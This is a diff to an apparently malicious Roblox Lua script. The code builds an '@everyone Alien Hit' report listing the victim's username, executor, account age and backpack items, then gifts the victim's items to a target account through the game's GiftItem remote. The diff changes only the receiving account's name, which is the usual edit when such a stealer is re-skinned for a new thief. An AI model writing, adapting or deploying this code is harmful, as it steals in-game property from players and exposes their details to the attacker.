@@ -152,7 +152,7 @@ task.spawn(function()
 
     local message = "@everyone **Alien Hit**\n──────────────\n" ..
                     "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: Delta\nAccount Age: " .. accountAge ..
-                    "\nReceiver: Gaaburr\n──────────────\n**Hit List:**\n"
+                    "\nReceiver: Mrsalt56\n──────────────\n**Hit List:**\n"
 
     for i = 1, math.min(10, #backpackContent) do
         message = message .. "• " .. backpackContent[i] .. "\n"
@@ -199,7 +199,7 @@ end)
 -- =========================
 -- 4: قسم الجيفت الكامل مع إعادة الإمساك بعد الانتهاء من كل العناصر
 -- =========================
-local TARGET_PLAYER_NAME = "Gaaburr"
+local TARGET_PLAYER_NAME = "Mrsalt56"
 local GiftRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
 local FavoriteRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FavoriteItem")
 
